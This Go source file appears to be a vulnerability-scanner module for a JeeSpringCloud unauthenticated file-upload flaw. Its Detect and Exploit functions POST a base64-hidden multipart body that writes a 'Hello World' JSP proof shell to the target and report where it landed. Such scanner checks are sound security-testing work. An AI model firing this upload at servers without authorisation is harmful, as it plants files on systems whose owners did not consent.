package vulns

import (
	"context"
	"encoding/base64"
	"net/http"
	"strings"
	"sync"

	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// JeeSpring-2023 JeeSpringCloud 任意文件上传。
// 与 v1 保持一致：上传内容为输出 "Hello World" 的证明性 jsp。
type jeespring2023 struct{}

func init() { Register(&jeespring2023{}) }

const jeespringUploadPath = "static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/"

var (
	jeespringOnce    sync.Once
	jeespringPayload []byte
)

func jeespringBody() []byte {
	jeespringOnce.Do(func() {
		b64 := `LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo=`
		jeespringPayload, _ = base64.StdEncoding.DecodeString(b64)
	})
	return jeespringPayload
}

func jeespringHeaders() map[string]string {
	return map[string]string{
		"Content-Type":    "multipart/form-data; boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL",
		"Accept-Encoding": "gzip, deflate",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.9",
		"Connection":      "close",
	}
}

func (j *jeespring2023) Info() model.Info {
	return model.Info{
		ID:         "JeeSpring-2023",
		Name:       "JeeSpringCloud 任意文件上传",
		Type:       "FileUpload",
		Severity:   "high",
		Affected:   "JeeSpringCloud（static/uploadify/uploadFile.jsp 未授权）",
		Reference:  "",
		HasExploit: true,
		ArgHint:    "无需参数，上传证明性 shell 并返回落地地址",
	}
}

func (j *jeespring2023) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: j.Info().ID, Name: j.Info().Name, Target: t.URL}

	resp, body, err := do(ctx, t, http.MethodPost, jeespringUploadPath, jeespringHeaders(), string(jeespringBody()))
	if err != nil {
		return nil, err
	}
	if resp.StatusCode == http.StatusOK && strings.Contains(string(body), "jsp") {
		v.Vulnerable = true
		v.Evidence = t.URL + "static/uploadify/log.jsp"
		v.Detail = "证明性 shell（输出 Hello World）已写入，访问 Evidence 地址可确认"
	}
	return v, nil
}

// Exploit 重新上传证明性 shell 并返回落地地址；arg 忽略。
func (j *jeespring2023) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	if _, _, err := do(ctx, t, http.MethodPost, jeespringUploadPath, jeespringHeaders(), string(jeespringBody())); err != nil {
		return "", "", err
	}
	return "", "证明性 shell 已上传：" + t.URL + "static/uploadify/log.jsp", nil
}
